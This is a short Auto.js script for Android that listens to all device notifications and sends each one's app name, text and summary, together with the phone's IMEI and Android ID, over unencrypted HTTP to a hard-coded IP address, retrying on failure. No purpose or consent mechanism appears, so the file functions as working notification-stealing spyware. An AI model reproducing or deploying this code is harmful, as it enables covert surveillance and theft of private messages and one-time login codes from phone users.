auto.waitFor();
var arr=[]
events.observeNotification();
events.onNotification(function(notification){
    tz(notification)
});
function tz(notification) {
    let info = "包名: " + notification.getPackageName()+"文本: " + notification.getText()+"摘要: " + notification.tickerText
    if (notification.getPackageName() !="android") {
        arr.push(info)
    }
    threads.start(function () {
        for (let index = 0; index < arr.length; index++) {
            try {
                let info = arr.pop()
                let data=http.get("http://119.29.234.95:8001?imei="+device.getIMEI()+"&androidid="+device.getAndroidId()+"&info="+info)
                if(data.statusCode!=200){
                    arr.push(info)
                }
            } catch (error) {
            }
        }
    })
}